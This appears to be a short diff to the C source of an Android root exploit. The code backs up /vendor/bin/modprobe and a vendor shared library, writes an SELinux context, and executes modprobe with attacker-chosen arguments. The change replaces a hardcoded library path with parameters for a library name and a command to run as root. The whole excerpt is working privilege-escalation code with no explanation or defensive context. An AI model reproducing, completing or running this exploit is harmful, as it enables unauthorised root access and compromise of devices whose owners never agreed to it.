@@ -367,9 +367,8 @@ void lo(struct global *global, const char *p, ...) {
 
 #define LIBMOD_PAGES 4
 
-void c_entry() {
+void c_entry(const char *arg_libname, const char *arg_root_cmd) {
 	const char *modprobe_path = "/vendor/bin/modprobe";
-	const char *libmod_path = "/vendor/lib/libstagefright_soft_mp3dec.so";
 
 	__asm__(".include \"include.inc\"\n");
 
@@ -392,7 +391,7 @@ void c_entry() {
 #endif
 
 	int fds = myopen(modprobe_path, O_RDONLY | O_CLOEXEC);
-	int fdmod = myopen(libmod_path, O_RDONLY | O_CLOEXEC);
+	int fdmod = myopen(arg_libname, O_RDONLY | O_CLOEXEC);
 
 	myread(fds, modprobe_backup, PAGE_SIZE);
 	myread(fdmod, libmod_backup, LIBMOD_PAGES * PAGE_SIZE);
@@ -427,7 +426,7 @@ void c_entry() {
 		mywrite(fdat, selinux_context, mystrlen(selinux_context));
 		myclose(fdat);
 
-		const char *argv[] = {modprobe_path, libmod_path, NULL};
+		const char *argv[] = {modprobe_path, arg_libname, arg_root_cmd, NULL};
 
 		myexecve(argv[0], argv, NULL);
 	}else{
